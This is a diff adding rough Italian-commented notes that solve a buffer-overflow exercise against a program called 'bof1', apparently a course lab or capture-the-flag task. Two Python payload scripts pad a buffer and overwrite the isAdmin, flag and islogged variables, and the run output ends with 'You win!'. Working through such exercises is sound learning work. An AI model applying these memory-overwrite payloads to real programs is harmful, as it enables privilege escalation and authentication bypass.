@@ -1,0 +1,57 @@
+// creo file da cui prog legge
+>touch adminfile
+// script py per riempire adminfile
+
+payload = bytearray()
+
+for i in range(100):
+    	payload.append("\x7A")
+
+for i in range(2):			//riempie isAdmin
+    	payload.append("\x04")
+	payload.append("\x03")
+	payload.append("\x02")
+	payload.append("\x01")
+
+payload.append("\x53")			//riempie flag
+payload.append("\x53")
+payload.append("\x41")
+payload.append("\x50")
+
+print payload
+// inserisco in adminfile
+python exploit.py > adminfile
+// eseguo
+./bof1 
+Insert your username:administrator
+Logged succesfully
+is admin ffffe178
+flag ffffe17c
+You win!
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%SOLUZ2%%%%%%%%%%%%%%%%%%%%%%%
+
+// uso stesso adminfile e script ma faccio login bof
+//creo loginfile
+touch loginfile
+//script python per riempire loginfile
+payload = bytearray()
+
+for i in range(110):			//riempio username + secret
+        payload.append("\x7A")
+
+for i in range(7):			//riempio islogged
+        payload.append("\x4B")
+        payload.append("\x43")
+        payload.append("\x41")
+        payload.append("\x48")
+
+print payload
+// riempio loginfile
+python exploitLog.py > loginfile
+// eseguo prog con input loginfile
+./bof1 < loginfile
+
+//NON E' POSSIBILE FARE TUTTO DA INPUT PERCHE' VIENE CONTROLLATO IL VALORE DI isadmin 
+//AL MOMENTO DEL LOGIN, NON RIESCO A SOVRASCRIVERE flag CON INPUT, SE FOSSI RIUSCITO 
+//AVREI SOVRASCRITTO flag CON L'INPUT E  isadmin CON adminfile
